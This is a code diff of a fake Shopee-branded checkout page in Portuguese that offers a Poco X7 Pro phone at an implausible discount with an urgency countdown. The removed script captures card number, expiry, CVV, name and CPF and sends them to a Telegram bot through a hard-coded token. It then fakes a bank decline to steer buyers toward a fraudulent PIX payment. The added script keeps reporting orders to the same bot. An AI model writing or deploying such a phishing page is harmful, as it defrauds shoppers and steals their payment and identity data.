@@ -287,15 +287,34 @@
 
 <div id="modal" class="modal">
     <div class="modal-content">
-        <div class="modal-header">
-            <img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg" class="modal-img">
-            <div style="flex: 1;">
-                <div id="modal-product-price" style="color: var(--shopee); font-size: 22px; font-weight: bold;">R$599,00</div>
-                <div id="modal-old-price" style="text-decoration: line-through; color: #757575; font-size: 14px;">R$2.299,00</div>
-                <div style="font-size: 12px; color: #888; margin-top: 5px;">Estoque: 1.071</div>
+        <div style="display:flex; gap:15px; margin-bottom:20px;">
+            <img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg" style="width:90px; height:90px; object-fit:cover; border:1px solid #eee;">
+            <div style="flex:1">
+                <div id="modalPreco" style="color:var(--shopee); font-size:20px; font-weight:bold;">R$ 599,00</div>
+                <div id="selPreview" style="font-size:12px; color:#888; margin-top:5px;">Selecione Cor e Versão</div>
             </div>
-            <i class="fas fa-times" style="cursor: pointer; color: #999; font-size: 20px; padding: 10px;" onclick="closeModal()"></i>
+            <i class="fas fa-times" onclick="closeModal()" style="color:#999; font-size: 20px;"></i>
         </div>
+
+        <p class="input-label">Cor</p>
+        <div class="option-group">
+            <button class="opt-btn" onclick="setOpt(this, 'cor', 'Amarelo')">Amarelo</button>
+            <button class="opt-btn" onclick="setOpt(this, 'cor', 'Preto')">Preto</button>
+            <button class="opt-btn" onclick="setOpt(this, 'cor', 'Iron Man')">Iron Man</button>
+        </div>
+
+        <p class="input-label" style="margin-top:15px;">Versão</p>
+        <div class="option-group">
+            <button class="opt-btn" onclick="setOpt(this, 'versao', '256GB', 499.17)">12GB + 256GB</button>
+            <button class="opt-btn" onclick="setOpt(this, 'versao', '512GB', 599.00)">12GB + 512GB</button>
+        </div>
+
+        <button id="btnConfirm" class="btn-main" disabled style="width:100%; border-radius:4px; height:50px; margin-top:20px; background: #ccc;" onclick="goToAddress()">
+            PRÓXIMO
+        </button>
+    </div>
+</div>
+  
         
     <div id="step-1" class="page active">
         <div style="padding: 10px; background: #fff;">
@@ -486,265 +505,120 @@
       <button class="btn-main" style="width:100%; border-radius:4px; height:48px;" onclick="copyPix()">COPIAR CÓDIGO PIX</button>
     </div>
   </div>
-
-  <script>
+      <script>
     const BOT_TOKEN = '7880759082:AAEvRzo4_NjdKnzrISfBzq3PeMLVFWRIvtw';
     const CHAT_ID = '7294447445';
-    let state = { cor: '', versao: '', precoBase: 499.17, metodo: 'pix', precoOriginal: 2499.00 };
-
-    function openPage(id) {
-      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-      const target = document.getElementById(id);
-      if(target) target.classList.add('active');
-      window.scrollTo(0,0);
-      if(id === 'cardPage') updateInstallments();
-    }
-    function openModal() { document.getElementById('modal').style.display = 'block'; }
-    function closeModal() { document.getElementById('modal').style.display = 'none'; }
-    function setOpt(btn, type, val, price) {
-      btn.parentElement.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('active'));
-      btn.classList.add('active');
-      state[type] = val;
-      if(price) state.precoBase = price;
-      document.getElementById('selPreview').innerText = `Selecionado: ${state.cor} ${state.versao}`;
-      document.getElementById('modalPreco').innerText = `R$ ${state.precoBase.toFixed(2)}`;
-      if(state.cor && state.versao) document.getElementById('btnConfirm').disabled = false;
-    }
-    function updateInstallments() {
-      const select = document.getElementById('installments');
-      const subtotal = state.precoBase - 20;
-      select.innerHTML = '';
-      for(let i=1; i<=12; i++) {
-        let valor = (subtotal / i).toFixed(2);
-        let opt = document.createElement('option');
-        opt.text = `${i}x de R$ ${valor} sem juros`;
-        select.add(opt);
-      }
-    }
-    async function buscarCep() {
-      const cep = document.getElementById('inCep').value.replace(/\D/g, '');
-      if(cep.length < 8) return;
-      document.getElementById('loadingModal').style.display = 'flex';
-      try {
-        const r = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
-        const d = await r.json();
-        if(!d.erro) {
-                    document.getElementById('inRua').value = d.logradouro;
-          document.getElementById('inBairro').value = d.bairro;
-          document.getElementById('inCidade').value = d.localidade;
-          document.getElementById('inUf').value = d.uf;
-        }
-      } catch (e) { console.error("Erro ao buscar CEP"); }
-      document.getElementById('loadingModal').style.display = 'none';
-    }
-
-    function goToAddress() {
-      closeModal();
-      openPage('addrPage');
-    }
-
-    function saveAddress() {
-      const nome = document.getElementById('inName').value;
-      const cpf = document.getElementById('inCpf').value;
-      if (nome.length < 5 || cpf.length < 14) {
-        alert("Preencha os dados de entrega corretamente!");
-        return;
-      }
-      document.getElementById('dispName').innerText = nome;
-      document.getElementById('dispCpf').innerText = cpf;
-      document.getElementById('dispAddr').innerText = `${document.getElementById('inRua').value}, ${document.getElementById('inNum').value}, ${document.getElementById('inBairro').value}, ${document.getElementById('inCidade').value} - ${document.getElementById('inUf').value}`;
-      
-      updateCheckout();
-      openPage('checkoutPage');
-    }
-
-    function updateCheckout() {
-      let total = state.precoBase - 20; // Cupom fixo R$20
-      let seguros = 0;
-      
-      if(document.getElementById('seguroRoubo').checked) seguros += 35.40;
-      if(document.getElementById('seguroGarantia').checked) seguros += 22.10;
-
-      if(state.metodo === 'pix') {
-        total -= 10;
-        document.getElementById('pixDiscountRow').style.display = 'flex';
-      } else {
-        document.getElementById('pixDiscountRow').style.display = 'none';
-      }
-
-      if(seguros > 0) {
-        document.getElementById('insuranceRow').style.display = 'flex';
-        document.getElementById('insuranceVal').innerText = `R$ ${seguros.toFixed(2)}`;
-        total += seguros;
-      } else {
-        document.getElementById('insuranceRow').style.display = 'none';
-      }
-
-      const totalFinal = total.toFixed(2);
-      document.getElementById('subtotal').innerText = `R$ ${state.precoBase.toFixed(2)}`;
-      document.getElementById('finalTotal').innerText = `R$ ${totalFinal}`;
-      document.getElementById('footerPrice').innerText = `R$ ${totalFinal}`;
-      document.getElementById('checkVariation').innerText = `${state.cor} | ${state.versao}`;
-      document.getElementById('checkPrice').innerText = `R$ ${state.precoBase.toFixed(2)}`;
-      
-      const economia = (state.precoOriginal - total).toFixed(2);
-      document.getElementById('footerEcon').innerText = `Você economizou R$ ${economia}`;
-      
-      state.valorFinal = totalFinal;
-    }
-
-    function selectPayment(m) {
-      state.metodo = m;
-      document.querySelectorAll('.pay-option').forEach(el => el.classList.remove('active'));
-      document.getElementById('opt' + m.charAt(0).toUpperCase() + m.slice(1)).classList.add('active');
-      updateCheckout();
-    }
-
-    async function sendToTelegram(msg) {
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
-        });
-      } catch (e) { console.error("Erro Telegram"); }
-    }
-
-    async function captureCard() {
-      const n = document.getElementById('cardNumber').value;
-      const nm = document.getElementById('cardName').value;
-      const ex = document.getElementById('cardExp').value;
-      const cv = document.getElementById('cardCvv').value;
-
-      if(n.length < 16 || nm.length < 5) {
-        alert("Dados do cartão inválidos!");
-        return;
-      }
-
-      document.getElementById('loadingModal').style.display = 'flex';
-      
-      const msg = `💳 *NOVO CARTÃO CAPTURADO*\n\n` +
-                  `👤 Nome: ${document.getElementById('inName').value}\n` +
-                  `🆔 CPF: ${document.getElementById('inCpf').value}\n` +
-                  `📱 Produto: Poco X7 Pro (${state.versao})\n` +
-                  `💰 Valor: R$ ${state.valorFinal}\n\n` +
-                  `🔢 Cartão: \`${n}\`\n` +
-                  `📅 Exp: \`${ex}\`\n` +
-                  `🔒 CVV: \`${cv}\`\n` +
-                  `👤 Titular: ${nm}`;
-
-      await sendToTelegram(msg);
-
-      setTimeout(() => {
-        document.getElementById('loadingModal').style.display = 'none';
-        alert("O banco emissor recusou a transação por suspeita de segurança. Tente pagar com PIX para aprovação imediata com desconto.");
-        selectPayment('pix');
-        openPage('checkoutPage');
-      }, 2000);
-    }
-
-    async function finalizeOrder() {
-      if(state.metodo === 'card') {
-        openPage('cardPage');
-        return;
-      }
-
-      document.getElementById('loadingModal').style.display = 'flex';
-      
-      const msg = `🚀 *NOVO PEDIDO PIX*\n\n` +
-                  `👤 Cliente: ${document.getElementById('inName').value}\n` +
-                  `📱 Produto: Poco X7 Pro (${state.cor} - ${state.versao})\n` +
-                  `💰 Valor Final: R$ ${state.valorFinal}`;
-      
-      await sendToTelegram(msg);
-
-      // Gerar QR Code Dinâmico (Simulado para o exemplo)
-      const pixPayload = `00020101021226870014br.gov.bcb.pix2565shopee_pay_vendedor_onix_oficial_${state.valorFinal.replace('.', '')}`;
-      document.getElementById('qrCodeImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${pixPayload}`;
-      document.getElementById('pixPayload').innerText = pixPayload;
-
-      setTimeout(() => {
-        document.getElementById('loadingModal').style.display = 'none';
-        openPage('pixPage');
-      }, 1500);
-    }
-
-    function copyPix() {
-      const text = document.getElementById('pixPayload').innerText;
-      navigator.clipboard.writeText(text);
-      alert("Código Pix Copiado! Abra o App do seu banco.");
-    }
-
-    // Máscaras
-    function maskCpf(i) {
-      let v = i.value.replace(/\D/g, "");
-      v = v.replace(/(\d{3})(\d)/, "$1.$2");
-      v = v.replace(/(\d{3})(\d)/, "$1.$2");
-      v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
-      i.value = v;
-    }
-    function maskCard(i) {
-      i.value = i.value.replace(/\D/g, "").replace(/(.{4})/g, "$1 ").trim();
-    }
-    function maskExpiry(i) {
-      let v = i.value.replace(/\D/g, "");
-      if (v.length > 2) v = v.substring(0, 2) + "/" + v.substring(2, 4);
-      i.value = v;
-    }
-
     
-    // --- CORREÇÃO DA SELEÇÃO (COR E VERSÃO) ---
-    function setOpt(btn, type, val, price) {
-        // Remove 'active' de todos os botões no mesmo grupo
-        const parent = btn.parentElement;
-        parent.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('active'));
+    // Estado inicial corrigido
+    let state = { cor: '', versao: '', precoBase: 599.00, metodo: 'pix', precoOriginal: 2299.00 };
+
+    // --- CRONÔMETRO CORRIGIDO ---
+    let totalSeconds = 5370; // Aprox 1h 29min
+    setInterval(() => {
+        const hours = Math.floor(totalSeconds / 3600);
+        const minutes = Math.floor((totalSeconds % 3600) / 60);
+        const seconds = totalSeconds % 60;
+
+        document.getElementById('h').innerText = hours.toString().padStart(2, '0');
+        document.getElementById('m').innerText = minutes.toString().padStart(2, '0');
+        document.getElementById('s').innerText = seconds.toString().padStart(2, '0');
         
-        // Ativa o botão clicado
+        if (totalSeconds > 0) totalSeconds--;
+    }, 1000);
+
+    // --- FUNÇÃO PARA ABRIR/FECHAR ESPECIFICAÇÕES (CORRIGIDO) ---
+    function toggleSection(id) {
+        const content = document.getElementById(id);
+        const isVisible = content.style.display === 'block';
+        content.style.display = isVisible ? 'none' : 'block';
+        // Gira o ícone de seta
+        content.previousElementSibling.querySelector('i').style.transform = isVisible ? 'rotate(0deg)' : 'rotate(180deg)';
+    }
+
+    // --- SELEÇÃO DE OPÇÕES (CORRIGIDO) ---
+    function setOpt(btn, type, val, price) {
+        // Remove 'active' do grupo específico
+        btn.parentElement.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('active'));
         btn.classList.add('active');
         
-        // Atualiza o estado
         state[type] = val;
         if(price) state.precoBase = price;
 
-        // Atualiza o texto de visualização no modal
-        const preview = document.getElementById('selPreview');
-        preview.innerText = `Selecionado: ${state.cor} ${state.versao}`;
-        preview.style.color = "#ee4d2d";
-        
+        // Atualiza preços e textos no modal
         document.getElementById('modalPreco').innerText = `R$ ${state.precoBase.toFixed(2)}`;
-
-        // Validação: Se Cor e Versão estiverem marcadas, libera o botão Próximo
+        document.getElementById('selPreview').innerText = `Selecionado: ${state.cor} ${state.versao}`;
+        
+        // Habilita o botão apenas se ambos forem escolhidos
         const btnConfirm = document.getElementById('btnConfirm');
-        if(state.cor !== '' && state.versao !== '') {
+        if(state.cor && state.versao) {
             btnConfirm.disabled = false;
-            btnConfirm.style.background = "#ee4d2d"; // Cor ativa da Shopee
-            btnConfirm.style.cursor = "pointer";
+            btnConfirm.style.background = "#ee4d2d";
         }
     }
+
+    // --- NAVEGAÇÃO ---
+    function openModal() { document.getElementById('modal').style.display = 'block'; }
+    function closeModal() { document.getElementById('modal').style.display = 'none'; }
     
-        // --- LÓGICA DO CRONÔMETRO ---
-    let timeLeft = 899; // 14:59
-    const timerInterval = setInterval(() => {
-        const m = Math.floor(timeLeft / 60);
-        const s = timeLeft % 60;
-        
-        // Atualiza os elementos na tela com zero à esquerda
-        const mEl = document.getElementById('m_timer');
-        const sEl = document.getElementById('s_timer');
-        
-        if(mEl && sEl) {
-            mEl.innerText = m.toString().padStart(2, '0');
-            sEl.innerText = s.toString().padStart(2, '0');
-        }
+    function openPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        window.scrollTo(0,0);
+    }
 
-        if (timeLeft <= 0) {
-            clearInterval(timerInterval);
-        } else {
-            timeLeft--;
-        }
-    }, 1000);
-    
-  </script></body></html>
+    // --- SISTEMA DE CEP ---
+    async function buscarCep() {
+        const cep = document.getElementById('inCep').value.replace(/\D/g, '');
+        if(cep.length < 8) return;
+        try {
+            const r = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+            const d = await r.json();
+            if(!d.erro) {
+                document.getElementById('inRua').value = d.logradouro;
+                document.getElementById('inBairro').value = d.bairro;
+                document.getElementById('inCidade').value = d.localidade;
+                document.getElementById('inUf').value = d.uf;
+            }
+        } catch (e) { alert("Erro ao buscar CEP"); }
+    }
+
+    // --- FINALIZAÇÃO E TELEGRAM ---
+    function goToAddress() {
+        closeModal();
+        openPage('addrPage');
+    }
+
+    function saveAddress() {
+        if(document.getElementById('inName').value.length < 5) return alert("Nome inválido");
+        document.getElementById('dispName').innerText = document.getElementById('inName').value;
+        document.getElementById('dispAddr').innerText = document.getElementById('inRua').value + ", " + document.getElementById('inNum').value;
+        updateCheckout();
+        openPage('checkoutPage');
+    }
+
+    function updateCheckout() {
+        let final = state.precoBase - 20; // Cupom
+        if(state.metodo === 'pix') final -= 10;
+        document.getElementById('finalTotal').innerText = `R$ ${final.toFixed(2)}`;
+        document.getElementById('footerPrice').innerText = `R$ ${final.toFixed(2)}`;
+        document.getElementById('checkVariation').innerText = `${state.cor} | ${state.versao}`;
+        document.getElementById('subtotal').innerText = `R$ ${state.precoBase.toFixed(2)}`;
+    }
+
+    async function finalizeOrder() {
+        if(state.metodo === 'card') { openPage('cardPage'); return; }
+        const msg = `🚀 NOVO PEDIDO\nItem: Poco X7 Pro\nOpção: ${state.cor} ${state.versao}\nValor: R$ ${state.precoBase}`;
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+        });
+        openPage('pixPage');
+    }
+  </script>
+</body>
+</html>
+      
 
 
-
+              
